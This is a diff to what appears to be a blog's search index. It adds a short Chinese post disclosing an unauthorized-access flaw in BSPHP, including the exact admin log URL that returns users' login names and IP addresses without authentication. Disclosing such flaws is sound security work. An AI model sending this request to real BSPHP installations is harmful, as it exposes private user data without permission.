@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title></title>
+      <link href="/2021/07/16/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+      <url>/2021/07/16/BSPHP%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BSPHP存在未授权访问"><a href="#BSPHP存在未授权访问" class="headerlink" title="BSPHP存在未授权访问"></a>BSPHP存在未授权访问</h1><p>该处泄漏的⽤户名和用户登陆 IP</p><p>URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/admin/index.php?m=admin&amp;c=log&amp;a=table_json&amp;json=get&amp;soso_ok=1&amp;t=user_login_log&amp;page=1&amp;limit=10&amp;</span><br></pre></td></tr></table></figure><p>直接进行访问即可获得如下数据</p><p><img src="./BSPHP存在未授权访问/wp_editor_md_90752b3880f4de0612a22c38542748d8.jpg" alt></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>谈谈对后台登录页面的渗透测试</title>
       <link href="/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
       <url>/2019/12/07/%E7%B2%BE%E5%93%81%E6%96%87%E7%AB%A0/%E8%B0%88%E8%B0%88%E5%AF%B9%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
